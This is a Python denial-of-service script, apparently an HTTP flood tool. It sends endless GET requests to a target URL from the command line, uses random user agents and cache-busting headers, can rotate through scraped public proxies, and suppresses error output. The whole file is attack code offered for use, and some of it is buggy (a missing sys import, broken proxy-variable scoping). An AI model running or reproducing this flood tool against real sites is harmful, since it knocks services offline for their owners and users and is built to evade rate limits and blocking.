import requests

import random

from fake_useragent import UserAgent

from multiprocessing import Process

def maintenance():

    if len(sys.argv) != 4:

        sys.exit()

    else:

        if sys.argv[3] == 'storm':

            print('[ CODE BY: OHMDEVPRO ]')

        elif sys.argv[3] == 'auto':

            proxyscrape_http = requests.get('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt')

            proxies = proxyscrape_http.text.replace('\r', '').split('\n')

            print('[ CODE BY: OHMDEVPRO ]')

        else:

            sys.exit()

    def run():

        if sys.argv[3] == 'storm':

            headers = {

                'Cache-Control': 'no-cache',

                'User-Agent': UserAgent().random

            }

            response = requests.get(sys.argv[2], headers=headers)

            print(response.status_code, "CODE BY: OHMDEVPRO")

        elif sys.argv[3] == 'auto':

            proxy = random.choice(proxies)

            proxies = {

                'http': 'http://' + proxy,

                'https': 'https://' + proxy

            }

            headers = {

                'Cache-Control': 'no-cache',

                'User-Agent': UserAgent().random

            }

            response = requests.get(sys.argv[2], headers=headers, proxies=proxies)

            print(response.status_code, "CODE BY: OHMDEVPRO")

    def time():

        while True:

            run()

    def th():

        if __name__ == '__main__':

            for _ in range(8):

                p = Process(target=time)

                p.start()

                print('RUNNING MAIN')

                p.join()

    th()

if __name__ == '__main__':

    sys.excepthook = lambda *args: None

    maintenance()

